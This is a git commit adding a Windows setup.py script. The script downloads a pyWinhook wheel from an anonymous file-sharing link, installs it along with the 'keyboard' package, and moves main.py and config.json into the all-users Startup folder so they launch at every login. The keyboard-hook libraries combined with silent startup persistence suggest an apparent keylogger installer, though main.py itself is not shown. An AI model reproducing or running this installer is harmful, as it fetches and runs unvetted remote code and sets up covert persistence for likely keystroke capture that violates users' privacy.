3f9469b3954f23b89df677d9375c39d39314d974
Someone's PC <footit4@gmail.com>
2021-05-20 14:38:03 -0700

    setup file implemented

---
+++ setup.py
@@ -0,0 +1,33 @@
+import subprocess
+import sys
+import requests
+import os
+
+
+def install(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+
+# download all needed libraries
+try:
+    import pyWinhook
+except ModuleNotFoundError:
+    r = requests.get(
+        "https://cdn-115.anonfiles.com/Pdy9l9xaud/0a52e7e1-1621545780/pyWinhook-1.6.2-cp39-cp39-win_amd64.whl",
+        allow_redirects=True,
+    )
+    open("pyWinhook-1.6.2-cp39-cp39-win_amd64.whl", "wb").write(r.content)
+    install("pyWinhook-1.6.2-cp39-cp39-win_amd64.whl")
+    os.remove("pyWinhook-1.6.2-cp39-cp39-win_amd64.whl")
+
+install("pythoncom")
+install("keyboard")
+
+# move main and config to startup folder
+os.rename(
+    "main.py", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\main.py"
+)
+os.rename(
+    "config.json",
+    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\config.json",
+)
